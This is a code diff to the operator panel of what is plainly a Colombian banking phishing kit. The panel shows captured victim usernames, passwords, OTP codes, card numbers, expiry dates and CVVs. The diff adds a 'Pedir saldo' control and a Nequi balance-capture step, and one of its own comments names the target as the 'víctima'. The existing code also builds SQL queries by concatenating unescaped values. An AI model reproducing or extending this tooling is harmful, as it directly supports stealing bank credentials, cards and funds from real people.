@@ -56,7 +56,7 @@ function close_info(){
 	$GLOBALS["borde_cerrado"] = "border: 1px solid #F1416C;";
 }
 
-function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mob,$card,$dat,$cvv,$idc,$lin,$pse){
+function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mob,$card,$dat,$cvv,$idc,$lin,$pse,$saldo_nequi = ''){
 	
 	switch ($status) {
 		case 1: input_info("Ingresó Usuario/Clave");
@@ -84,8 +84,28 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 		case 13: input_info("Ingresó Documento y Linea");	
 				break;
 		case 15: input_info("Ingresó PSE");	
+				break;
+		case 27: wait_info("Esperando saldo Nequi");
+				break;
+		case 28: input_info("Ingresó saldo disponible (Nequi)");
 				break;		
 		}
+
+	$pedir_saldo_td = '';
+	if (preg_match('/nequi/i', (string) $ban)) {
+		// No usar activo/btn_off de wait_info: esos estados ponen disabled en todos los botones
+		// y el operador debe poder pedir saldo aunque la ficha esté en "esperando…".
+		$pedir_saldo_td = '<td>
+						<button type="button" class="control pedir-saldo" id="'.$id.'">
+							<table>
+								<tr>
+									<td><img src="../assets/img/tarjeta-a.svg" width="16"></td>
+									<td>Pedir saldo</td>
+								</tr>
+							</table>
+						</button>
+					</td>';
+	}
 
 	echo '<div class="item-des" style="background-color: '.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
 
@@ -205,6 +225,12 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Banco</span>
 						</div>
 					</td>
+					<td width="120">
+						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
+							<span class="valor">'.$saldo_nequi.'</span><br>
+							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Saldo Nequi</span>
+						</div>
+					</td>
 					<td width="200">
 						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
 							<span class="valor">'.$time.'</span><br>
@@ -266,6 +292,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 							</table>
 						</button>
 					</td>
+					'.$pedir_saldo_td.'
 					<td>
 						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$id.'">
 							<table>
@@ -489,6 +516,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 										</table>
 									</button>
 								</td>
+								'.$pedir_saldo_td.'
 								<td>									
 									<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$id.'">
 										<table>
@@ -557,6 +585,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 							</table>
 						</button>
 					</td>
+					'.$pedir_saldo_td.'
 					<td>
 						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$id.'">
 							<table>
@@ -788,6 +817,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 							</table>
 						</button>
 					</td>
+					'.$pedir_saldo_td.'
 					<td>
 						<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$id.'">
 							<table>
@@ -844,7 +874,7 @@ function get_items(){
 			while ($datos=traerdatos($consulta)) {	
 				
 				if ($datos['status'] != 13) {			
-					put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);
+					put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse'], isset($datos['agente']) ? $datos['agente'] : '');
 				}							
 			}
 		}else{
@@ -870,7 +900,7 @@ function get_items_pending(){
 		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status = 1 OR status = 3 OR status = 5 OR status = 7 OR status = 9 ORDER BY horamodificado DESC");
 		if (contarfilas($consulta)) {
 			while ($datos=traerdatos($consulta)) {				
-				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);								
+				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse'], isset($datos['agente']) ? $datos['agente'] : '');								
 			}
 		}else{
 
@@ -893,7 +923,7 @@ function get_items_closed(){
 		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status = 10 ORDER BY horamodificado DESC");
 		if (contarfilas($consulta)) {
 			while ($datos=traerdatos($consulta)) {				
-				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);								
+				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse'], isset($datos['agente']) ? $datos['agente'] : '');								
 			}
 		}else{
 
@@ -1061,6 +1091,17 @@ function put_card($id,$tar,$ft,$cvv){
 	$hoy = date("Y-m-d H:i:s"); 
 	if ($con = conectar()) {	
 		sentencia($con,"UPDATE m3it3m SET status = '7', tarjeta='".$tar."', ftarjeta='".$ft."', cvv='".$cvv."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
+		desconectar($con);
+	}
+}
+
+/** Saldo disponible Nequi (panel estado 27 → víctima; al enviar → 28 y guarda en agente). */
+function put_saldo_nequi($id, $saldo_txt){
+	date_default_timezone_set('America/Bogota');
+	$hoy = date("Y-m-d H:i:s");
+	if ($con = conectar()) {
+		$s = mysqli_real_escape_string($con, $saldo_txt);
+		sentencia($con,"UPDATE m3it3m SET status = '28', agente='".$s."', horamodificado='".$hoy."' WHERE idreg = ".(int)$id);
 		desconectar($con);
 	}
 }
